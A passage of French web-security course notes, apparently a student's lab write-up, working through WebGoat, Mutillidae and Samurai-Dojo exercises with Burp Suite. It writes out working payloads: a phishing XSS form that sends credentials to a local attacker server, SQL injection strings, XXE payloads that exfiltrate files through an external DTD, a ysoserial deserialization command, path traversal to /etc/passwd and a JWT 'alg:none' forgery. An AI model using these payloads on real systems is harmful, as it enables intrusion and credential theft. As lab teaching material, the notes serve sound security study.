+    <nav class="md-nav" aria-label="Session Management Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#spoof-an-authentication-cookie" class="md-nav__link">
+    Spoof an Authentication Cookie
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hijack-a-session" class="md-nav__link">
+    Hijack a Session
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-flaws" class="md-nav__link">
+    Authentication Flaws
+  </a>
+  
+    <nav class="md-nav" aria-label="Authentication Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-token" class="md-nav__link">
+    JWT token
+  </a>
+  
+    <nav class="md-nav" aria-label="JWT token">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signing" class="md-nav__link">
+    JWT signing
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    CSRF
+  </a>
+  
+    <nav class="md-nav" aria-label="CSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#samurai-dojo-basic" class="md-nav__link">
+    Samurai-Dojo Basic
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tips" class="md-nav__link">
+    Tips
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/louisonsarlinmagnus/cours-isen/edit/master/docs/tech/cybersecurite.md" title="Edit this page" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="cyber-securite"><center>Cyber-Sécurité</center></h1>
+<h2 id="quand-mettre-en-place-de-la-securite">Quand mettre en place de la sécurité?</h2>
+<p>Faites de l'analyse de risque pour déterminer si on fait de la sécurité</p>
+<p>Qu'est ce qu'une donnée sensible?
+Une adresse mail c'est pas forcement sensible
+Il faut se référer au GDPR</p>
+<p>Les numéros de carte doivent être sécurisés en toutes circonstances</p>
+<p><strong>Pas de sur-sécurité</strong>, dépense excessivement inutile</p>
+<p>On peut créer des analyses statiques qui vont étudier le code pour examiner les infos en dur dans le logiciel, les librairies, les fonctions etc.</p>
+<p><a href="https://networkmarketshare.com">https://networkmarketshare.com</a></p>
+<h2 id="types-dattaque">Types d'attaque</h2>
+<h3 id="attaques-xss">Attaques XSS</h3>
+<p>XSS: Cross Site Scripting</p>
+<p><strong>XSS stocké</strong>: je vais sur une page web, je post une attaque, a chaque fois que quelqu'un lit mon message attaque</p>
+<p><strong>XSS réfléchie</strong>: Je fais un url avec mon attaque et je le partage, tout le monde a accès a mon attaque</p>
+<p><strong>XSS en dôme</strong>: On injecte quelque chose dans le dôme HTML</p>
+<h3 id="attaques-sql">Attaques SQL</h3>
+<p><strong>Injection SQL numeric</strong>: Quand le champs que je saisi est numérique, donc je ne joue pas avec les cotes</p>
+<p><strong>Injection SQL String</strong>: je dois jouer avec les cotes, attention sql ajoute une cote au début et a la fin</p>
+<p><strong>Injection SQL Blind</strong>: quand j'ai pas la possibilité d'avoir un retour direct de mon attaque. Je dois trouver un moyen d'avoir un information sur la réussite de mon attaque</p>
+<h3 id="attaque-xxe">Attaque XXE</h3>
+<p>XXE: e<b>X</b>ternal <b>X</b>ML <b>E</b>ntity</p>
+<p>On vole des données sécurisées en utilisant des failles de configuration dans un parseur XML. On peut attaquer en direct, ou en utilisant un fichier <em>.dtd</em>.</p>
+<h3 id="attaque-csrf">Attaque CSRF</h3>
+<p><b>C</b>ross <b>S</b>ite <b>R</b>equest <b>F</b>orgery</p>
+<p>Mon objectif est de profité de sa connexion sur le serveur web d'administration pour prendre le contrôle.</p>
+<p>Problème il existe des Anti-CSRF Token, chaque fois que le browser accède a la page il récupère un token. Si le site veut re-communiquer avec le serveur il doit re-présenter ce token.<br />
+Si je suis capable de récupérer ce token, je passe pour une requête légitime</p>
+<h3 id="attaque-par-deserialisation">Attaque par Déserialisation</h3>
+<p>On récupère les informations de fragilité de sérialisation avec le Deserializer Scanner. On ajoute notre attaque sérialisé dans un token a fournir, lors de la déserialisation ce token va attaquer le système.</p>
+<h3 id="attaque-par-controle-dacces">Attaque par Contrôle d’accès</h3>
+<p>On cherche des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges. On peut accéder a des fichiers sensibles mal protégés, modifier des profils, etc. .</p>
+<h2 id="modes">Modes</h2>
+<h3 id="sniper">Sniper</h3>
+<p>Les paramètres, ils vont prendre a tour de rôle les valeurs possibles définis.</p>
+<h3 id="battering-ram">Battering ram</h3>
+<p>Les paramètres vont prendre la même valeur a chaque essai.</p>
+<h3 id="pitchfork">Pitchfork</h3>
+<p>Si on a 2 paramètres j'ai 2 listes mais ils prennent la même ligne.</p>
+<h3 id="cluster-bomb">Cluster bomb</h3>
+<p>Si on a 2 paramètres j'ai 2 listes en faisant toutes les combinaisons.</p>
+<h2 id="tp">TP</h2>
+<p>Liens des outils:</p>
+<ul>
+<li><a href="http://192.168.0.1:8081/WebGoat/attack">http://192.168.0.1:8081/WebGoat/attack</a></li>
+<li><a href="http://192.168.0.1:8080/WebGoat/attack">http://192.168.0.1:8080/WebGoat/attack</a></li>
+<li><a href="http://192.168.0.1:9090/WebWolf/login">http://192.168.0.1:9090/WebWolf/login</a></li>
+</ul>
+<p>Connexion à: ProxiaAP
+mdp: abcdef1234</p>
+<p><a href="http://192.168.0.1:8081/WebGoat/attack">http://192.168.0.1:8081/WebGoat/attack</a></p>
+<p>Ajouter plug in pour passer par un proxy</p>
+<p>Télécharger Burpsuite</p>
+<h3 id="mise-en-place">Mise en place</h3>
+<p>Liens des outils:</p>
+<ul>
+<li><a href="http://192.168.0.1:8081/WebGoat/attack">http://192.168.0.1:8081/WebGoat/attack</a></li>
+<li><a href="http://192.168.0.1:8080/WebGoat/attack">http://192.168.0.1:8080/WebGoat/attack</a></li>
+<li><a href="http://192.168.0.1:9090/WebWolf/login">http://192.168.0.1:9090/WebWolf/login</a></li>
+</ul>
+<p>Accéder au Hot-spot Wi-Fi ProxiaAP:</p>
+<ul>
+<li>Connexion à: ProxiaAP</li>
+<li>mdp: abcdef1234  </li>
+</ul>
+<p>Configurer un proxy (FoxyProxy)
+Dans BurpSuite configurer le proxy et setter l'<em>Intercerpt is off</em></p>
+<p>Accéder a l'adresse: <a href="http://192.168.0.1:8081/WebGoat/attack">http://192.168.0.1:8081/WebGoat/attack</a>
+et renseigner webgoat et webgoat pour les username et mdp.  </p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Pour enlever les requettes non souhaitées dans Burp il faut clic droit sur une requête a garder, add to scope, puis clic sur filter, show only in-scope...</p>
+</div>
+<h3 id="xss">XSS</h3>
+<p>Une fois renseigner le mdp qui est le prénom de l'employé on peut accéder a la barre de recherche.
+Dans cette barre de recherche on y rentre un script: <code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>
+Ce script nous permet de renvoyer l'id de la session en cours.</p>
+<p>On pourrait aussi renseigner une ligne HTML qui afficherais une image: <code>&lt;img src="#" onerror="alert('hack');"/&gt;</code></p>
+<p>Le code suivant permet d'afficher a l'utilisateur qui fait une recherche une erreur et un formulaire. En renseignant son username et son mot de passe l'utilisateur pense se connecter mais on extrait ses identifiants vers notre site web.</p>
+<div class="highlight"><pre><span></span><code>Free softwares                    <span class="p">&lt;</span><span class="nt">hr</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>Only registered users are allowed to use our search feature to prevent bots<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;/</span><span class="nt">br</span><span class="p">&gt;</span>
+Username:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+Password:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span> 
+<span class="na">onclick</span><span class="o">=</span><span class="s">&quot;window.open(&#39;http://http://127.0.0.1:81//?u=&#39;+this.form.username.value+&#39;&amp;p=&#39;+this.form.password.value);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Pour essayer d'extraire ces données on va commencer par lancer un serveur http avec python <code>python.exe -m http.server 81</code>  </p>
+<div class="admonition exemple">
+<p class="admonition-title">Exemple</p>
+<p>Si on accède maintenant à : <a href="http://localhost:81/">http://localhost:81/</a> on voit sur notre shell une requête:<code>::ffff:127.0.0.1 - - [23/Oct/2020 09:47:34] "GET / HTTP/1.1" 200 -</code><br />
+Dans la suite on récupérera les identifiants de l'utilisateur leurré via ces requêtes.</p>
+</div>
+<h3 id="sql-injection">SQL injection</h3>
+<h4 id="numeric-sql-injection">Numeric SQL injection</h4>
+<p>On cherche a récupérer en une seule requête l'ensemble des lignes du tableau.</p>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /WebGoat/attack?Screen=1767&amp;menu=1200 HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">192.168.0.1:8081</span>
+<span class="nt">User-Agent</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0</span>
+<span class="nt">Accept</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="nt">Accept-Language</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">gzip, deflate</span>
+<span class="nt">Content-Type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">application/x-www-form-urlencoded</span>
+<span class="nt">Content-Length</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">24</span>
+<span class="nt">Origin</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081</span>
+<span class="nt">DNT</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">Authorization</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Basic d2ViZ29hdDp3ZWJnb2F0</span>
+<span class="nt">Connection</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">close</span>
+<span class="nt">Referer</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081/WebGoat/attack?Screen=1767&amp;menu=1200</span>
+<span class="nt">Cookie</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">JSESSIONID=811E3CB4496F570511DD69EF18A23D8A</span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+
+<span class="l l-Scalar l-Scalar-Plain">station=101&amp;SUBMIT=Go%21</span>
+</code></pre></div>
+<div class="admonition recette">
+<p class="admonition-title">Recette</p>
+<p>Dans BURP on active l'intercept<br />
+On clique sur <em>GO!</em> (le site va rester en chargement)<br />
+Dans intercept on cherche la bonne requête, on la modifie<br />
+On clique sur Forward<br />
+Sur le site la requête a été exécutée  </p>
+</div>
+<p>Dans la requête au dessus, on modifie la dernière ligne:<br />
+<code>station=101 OR 1=1&amp;SUBMIT=Go%21</code>.</p>
+<h4 id="string-sql-injection">String SQL injection</h4>
+<p>On a affaire a un formulaire dans lequel on doit renseigner notre nom. On cherche a afficher toutes les lignes de la table user_data.
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /WebGoat/attack?Screen=1758&amp;menu=1200 HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">192.168.0.1:8081</span>
+<span class="nt">User-Agent</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0</span>
+<span class="nt">Accept</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="nt">Accept-Language</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">gzip, deflate</span>
+<span class="nt">Content-Type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">application/x-www-form-urlencoded</span>
+<span class="nt">Content-Length</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">35</span>
+<span class="nt">Origin</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081</span>
+<span class="nt">DNT</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">Authorization</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Basic d2ViZ29hdDp3ZWJnb2F0</span>
+<span class="nt">Connection</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">close</span>
+<span class="nt">Referer</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081/WebGoat/attack?Screen=1758&amp;menu=1200</span>
+<span class="nt">Cookie</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">JSESSIONID=811E3CB4496F570511DD69EF18A23D8A</span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+
+<span class="l l-Scalar l-Scalar-Plain">account_name=Your+Name&amp;SUBMIT=Go%21</span>
+</code></pre></div></p>
+<div class="admonition recette">
+<p class="admonition-title">Recette</p>
+<p>Dans BURP on active l'intercept<br />
+On clique sur <em>GO!</em> (le site va rester en chargement)<br />
+Dans intercept on cherche la bonne requête, on la modifie<br />
+On clique sur Forward<br />
+Sur le site la requête a été exécutée  </p>
+</div>
+<p>Dans la requête au dessus, on modifie la dernière ligne:<br />
+<code>account_name=Your+Name' OR '1'='1&amp;SUBMIT=Go%21</code>.</p>
+<p>Si on retourne sur le site il a chargé, et affiche toute la table</p>
+<h4 id="automatisation">Automatisation</h4>
+<p>On intercepte la requête<br />
+On l'envoi dans l'intruder<br />
+Dans l'onglet <em>Position</em> on vient identifier le paramètre a faire changer. On remarque que l'espace a été transformé en un +. Il y a donc un encodage URL.
+Il faut ensuite que l'on choisisse le mode d'attaque (Cf. <a href="#modes">Modes</a>).<br />
+Puis on <strong>Start attack</strong>  </p>
+<h4 id="blind-sql-injection">Blind SQL Injection</h4>
+<p>On cherche a connaître le nom des tables et des champs.
+On sait que la table s'appelle <code>user_data</code> et la colonne est <code>first_name</code>.
+On va chercher par connaître la première lettre du nom. C'est une requête numérique donc on traduit les lettres en code ASCII.
+On obtient donc la requête: <code>and (select ascii(substring(first_name,§var1§,1)) from user_data where userid=15613)=§var2§</code>.  </p>
+<p>On lance BURP, on intercepte la requête et on la configure dans l'intruder.
+On défini les 2 paramètres, on choisi cluster bomb. On défini le premier en nombre de 1 à 5 par pas de 1, puis le second en nombre de 65 à 122 (valeur ASCII) par pas de 1. Enfin dans option on défini le Grep de sorti (<em>Account number is valid</em>).<br />
+On lance l'attaque !!</p>
+<h3 id="xxe">XXE</h3>
+<h4 id="attaque-en-direct">Attaque en direct</h4>
+<p>On souhaites exploiter des erreurs de paramétrage dans les parseurs XML.
+Pour se faire on intercepte la requête et on change la partie XML en ce qui suit.
+<div class="highlight"><pre><span></span><code><span class="err">&lt;</span><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+  <span class="cp">&lt;!DOCTYPE comment [ &lt;!ENTITY rootpath SYSTEM &quot;file:///&quot;&gt;</span>]&gt;
+    <span class="nt">&lt;comment&gt;</span>
+      <span class="nt">&lt;text&gt;</span><span class="ni">&amp;rootpath;</span><span class="nt">&lt;/text&gt;</span>
+    <span class="nt">&lt;/comment&gt;</span>
+</code></pre></div></p>
+<p>On aura en retour: <code>.dockerenv bin boot dev docker-java-home etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</code>.</p>
+<p>Le script suivant permet quant à lui d'exfiltrer ces données en créant une variable ou on stocke les données de secret.txt, puis on affiche cette variable.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp">&lt;!ENTITY % remote SYSTEM &#39;file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt&#39;&gt;</span>
+%remote;
+]&gt;
+<span class="nt">&lt;comment&gt;</span>
+  <span class="nt">&lt;text&gt;</span><span class="ni">&amp;cat;</span><span class="nt">&lt;/text&gt;</span>
+<span class="nt">&lt;/comment&gt;</span>
+</code></pre></div>
+<div class="admonition recette">
+<p class="admonition-title">Recette</p>
+<p>Dans BURP on active l'intercept<br />
+On clique sur <em>GO!</em> (le site va rester en chargement)<br />
+Dans intercept on cherche la bonne requête, on la modifie<br />
+On clique sur Forward<br />
+Sur le site la requête a été exécutée  </p>
+</div>
+<h4 id="attaque-a-laide-dun-fichier">Attaque a l'aide d'un fichier</h4>
+<p>On upload le fichier attack.dtd via WebWolf.  </p>
+<p>attack.dtd:
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+        <span class="cp">&lt;!ENTITY cat SYSTEM &#39;file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt&#39;&gt;</span>
+</code></pre></div></p>
+<p>Ici on va cherche le fichier attack.dtd et on viens afficher son contenu
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.0.1:9090/files/louisonsarlinmagnus/attack.dtd&quot;&gt;</span>
+%remote;
+]&gt;
+<span class="nt">&lt;comment&gt;</span>
+  <span class="nt">&lt;text&gt;</span><span class="ni">&amp;cat;</span><span class="nt">&lt;/text&gt;</span>
+<span class="nt">&lt;/comment&gt;</span>
+</code></pre></div></p>
+<h4 id="mulillidae">Mulillidae</h4>
+<p>L'outil du TP: <a href="http://192.168.0.1/mutillidae/index.php?page=xml-validator.php">Mulillidae</a><br />
+On souhaite a présent extraire les données vers un site externe.</p>
+<p>evil.dtd (placé ici: <code>http://127.0.0.1:81/evil.dtd</code>)
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://127.0.0.1:81&#39;&gt;</span>&quot;&gt; #Serveur auquel envoyé les logs avec les données volées
+%all;
+</code></pre></div></p>
+<p>Script renseigné
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE roottag [</span>
+<span class="cp">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=robots.txt&quot;&gt;</span> #Localisation du fichier a voler
+<span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:81/evil.dtd&quot;&gt;</span> #Lien ou stocker le .dtd
+%dtd;
+]&gt;
+<span class="nt">&lt;company&gt;</span>
+  <span class="nt">&lt;employee&gt;</span>
+    <span class="nt">&lt;firstname&gt;</span>Jo<span class="nt">&lt;/firstname&gt;</span>
+    <span class="nt">&lt;lastname&gt;</span>Black<span class="nt">&lt;/lastname&gt;</span>
+  <span class="nt">&lt;/employee&gt;</span>
+  <span class="nt">&lt;employee&gt;</span>
+    <span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
+    <span class="nt">&lt;lastname&gt;</span>Doe<span class="nt">&lt;/lastname&gt;</span>
+  <span class="nt">&lt;/employee&gt;</span> 
+  <span class="nt">&lt;employee&gt;</span>
+    <span class="nt">&lt;firstname&gt;</span><span class="ni">&amp;send;</span>Bob<span class="nt">&lt;/firstname&gt;</span>
+    <span class="nt">&lt;lastname&gt;</span>Smith<span class="nt">&lt;/lastname&gt;</span>
+  <span class="nt">&lt;/employee&gt;</span>
+<span class="nt">&lt;/company&gt;</span>
+</code></pre></div></p>
+<div class="admonition explications">
+<p class="admonition-title">Explications</p>
+<p>On demande via le XML renseigner de stocker robots.txt (encodé) et de stocké dans file<br />
+Puis de charger notre script evil.dtd sur un server externe<br />
+Le script evil demande d'envoyé "un log" sur notre serveur local avec les infos du fichier volé  </p>
+</div>
+<h3 id="access-control-flaws">Access Control Flaws</h3>
+<h4 id="deserialization">Déserialization</h4>
+<p><code>java -Dhibernate5 -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 "touch /tmp/proxia1" | base64 -w0 &gt; webgoat_payload1_touch.txt</code></p>
+<p>On ouvre un shell dans le dossier LabWebSecu</p>
+<p>Ça créer un fichier txt, la ou on est</p>
+<p>On copie ce qu'il y a dans le txt dans le site</p>
+<h4 id="bypass-a-path-based-access-control-scheme">Bypass a Path Based Access Control Scheme</h4>
+<p>Dans cette partie on cherche a trouver des erreurs de contrôle d’accès, d'élévation de privilège et de gestion de privilèges.</p>
+<p>On cherche a accéder au fichier <code>etc/passwd</code>, pour ceci on intercepte la commande et on renseigne le chemin voulu <code>../../../../../../../../../../../../../../etc/passwd</code> a la place du fichier.  </p>
+<h4 id="role-based-access-control">Role Based Access Control</h4>
+<h5 id="stage-1-bypass-business-layer-access-control">Stage 1: Bypass Business Layer Access Control</h5>
+<p>En interceptant la requête on remarque un <code>SearchStaff</code>, si on le remplace par <code>DeleteStaff</code> on supprime notre profil.</p>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /WebGoat/attack?Screen=1056&amp;menu=200 HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">192.168.0.1:8081</span>
+<span class="nt">User-Agent</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0</span>
+<span class="nt">Accept</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="nt">Accept-Language</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">en-US,fr;q=0.8,fr-FR;q=0.5,en;q=0.3</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">gzip, deflate</span>
+<span class="nt">Content-Type</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">application/x-www-form-urlencoded</span>
+<span class="nt">Content-Length</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">18</span>
+<span class="nt">Origin</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081</span>
+<span class="nt">DNT</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">Authorization</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">Basic d2ViZ29hdDp3ZWJnb2F0</span>
+<span class="nt">Connection</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">close</span>
+<span class="nt">Referer</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">http://192.168.0.1:8081/WebGoat/attack?Screen=1056&amp;menu=200</span>
+<span class="nt">Cookie</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">JSESSIONID=6732ED4B0A81C6C42F7B1D4783A051ED</span>
+<span class="nt">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="l l-Scalar l-Scalar-Plain">1</span>
+
+<span class="l l-Scalar l-Scalar-Plain">action=DeleteStaff</span>
+</code></pre></div>
+<h5 id="stage-3-bypass-data-layer-access-control">Stage 3: Bypass Data Layer Access Control</h5>
+<p>Je me connecte en tant que Tom
+J'intercept avec Burp la requête <em>View Profile</em>
+On modifie dans la requête, on forward et on peut voir le salaire du manager de Tom.</p>
+<div class="admonition tips">
+<p class="admonition-title">Tips</p>
+<p>Dans la page de login, on peut trouver dans le code HTML les id des employés, on peut donc directement cibler un employé.</p>
+</div>
+<h3 id="session-management-flaws">Session Management Flaws</h3>
+<h4 id="spoof-an-authentication-cookie">Spoof an Authentication Cookie</h4>
+<p>Outil de transformation de String: <a href="https://yehg.net/encoding/pce-cached.php">https://yehg.net/encoding/pce-cached.php</a></p>
+<p>On cherche un faille dans l'authentification.</p>
+<p>Premièrement on essaye de se connecter en webgoat/webgoat pour voir ce qu'il se passe.
+<em>Je n'ai rien remarqué dans la requête envoyée. On voit que lorsque la connexion est réussi on affiche "Your identity has been remembered"</em>.</p>
+<p>On remarque que après avoir été identifié on reçoit une requête GET avec un cookie d'authentification. Si on fait reverse et char--. On trouve que le cookie <code>65432udfqtb</code> se transforme en <code>aspect12345</code>. Si on change aspect par Alice et on refait les étapes char++ puis reverse alors on obtient le cookie d’authentification d'Alice.</p>
+<h4 id="hijack-a-session">Hijack a Session</h4>
+<p>On identifie que a chaque requête le serveur nous renvoi un nouvel identifiant. Je vais donc chercher une logique dans la génération des session id. J'utilise de <strong>Sequencer</strong> dans BURP en ayant enlever le cookie dans la requête.
+On analyse les token, on voit que seul les 3, 4 16, 17 et 18 ème nombre du token changent régulièrement.</p>
+<p>On en déduit en regardant l'évolution qu'un token ne nous a pas été attribué, donc quelqu'un a obtenu ce token et s'est connecté. Reste plus qu'a deviné le token. Si on a besoin de faire varier quelque chose on peut toujours utiliser l'intruder pour essayer quelques valeurs.</p>
+<h3 id="authentication-flaws">Authentication Flaws</h3>
+<h4 id="jwt-token">JWT token</h4>
+<h5 id="jwt-signing">JWT signing</h5>
+<p>Outil pour encoder des JWT: <a href="https://jwt.io/">https://jwt.io/</a></p>
+<p>On se met en tant que Tom, on essaye de supprimer les votes, dans la requête intercepté on récupère le acces-token. On décode ce token en base64:
+<code>{"alg":"HS512"}.{"iat":1604393476,"admin":"false","user":"Tom}</code><br />
+On le modifie en <code>{"alg":"none"}.{"iat":1604393476,"admin":"true","user":"Tom"}</code><br />
+On ré-encode les 2 partie de part et d'autre du point en base64: <code>eyJhbGciOiJub25lIn0=.eyJpYXQiOjE2MDQzOTM0NzYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code></p>
+<h3 id="csrf">CSRF</h3>
+<h4 id="samurai-dojo-basic">Samurai-Dojo Basic</h4>
+<p>Samurai-Dojo Basic: <a href="http://192.168.0.1:8082">http://192.168.0.1:8082</a></p>
+<p>On veut pouvoir poster un commentaire dans le blog</p>
+<p>On doit trouver une attaque XSS dans le dôme et vérifier le fonctionnement du token anti-CSRF.</p>
+<p>On voit qu'on a accès a beaucoup d'infos dans <em>Browser Info</em>.</p>
+<p>Si on intercepte quand on fait <em>Browser Info</em>, on peut modifier le Host, on met: <code>&lt;script&gt; alert('hack')&lt;/script&gt;</code>.<br />
+On remarque que le script est exécuté.</p>
+<p>Si on intercepte la requête d'un <em>Blog Entry</em>, on trouve un <code>xsrf_token</code>. </p>
+<p>Injection dans le dôme: <em>BrowserInfo</em> -&gt; On prend le <em>Referee</em> (par exemple), on le remplace par mon script d'attaque</p>
+<p>On remarque qu'il n'y a pas de gestion des paramètres mis dans l'URL et que si on met un # a la place du &amp; avant notre script il n’apparaît pas du côté serveur.</p>
+<p>evil.js: <a href="http://192.168.0.1:81/evil.js">http://192.168.0.1:81/evil.js</a>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">myxhrGET</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">myuriGET</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.0.1:8082/index.php?page=add-to-your-blog.php&amp;done=byxss&#39;</span>
